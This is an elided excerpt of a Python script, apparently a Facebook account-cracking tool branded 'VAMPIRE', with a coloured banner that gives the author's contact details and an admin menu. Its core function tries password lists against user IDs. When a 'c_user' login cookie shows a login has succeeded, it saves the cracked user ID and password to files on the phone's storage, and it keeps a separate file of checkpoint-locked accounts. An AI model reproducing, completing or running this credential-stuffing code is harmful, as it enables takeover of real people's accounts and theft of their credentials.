...
os.system("xdg-open https://github.com/X-Pranta69")
...
|___/_/  |_/_/  /_/_/   /___/_/ |_/_____/                                                                                                                                        
                ...
                \033[1;30m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 COMAND ♚

\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃

\033[38;5;46m ▊                                                 ██

\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \33[97;1mVAMPIRE ♚   \033[38;5;46m               ▇▎ ▎  

\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \033[38;5;196m: \033[1;92m+𝟖𝟖𝟎1611178800 \033[38;5;46m                  ▇▎

\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/X-Pranta69\033[38;5;46m ▇▎
...
def admin():
	...
	if bal =='1':
		...
		os.system('xdg-open https://wa.me/+8801611178800');time.sleep(1)

		admin()

	if bal =='2':

		os.system('xdg-open https://www.facebook.com/profile.php?id=100088437933444');time.sleep(1)

		admin()

	if bal =='3':

		os.system('xdg-open https://github.com/X-Pranta69');time.sleep(1)
...
def hoga_check():
  ...
  try: 
    ...
    httpCaht = requests.get("https://raw.githubusercontent.com/VAMPIRE/RANDOM/main/Apruval.txt").text 
...
def a(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mVAMPIRE\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/VAMPIRE-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                ...
                open('/sdcard/VAMPIRE-CP.txt', 'a').write( uid+' | '+ps+' \n')
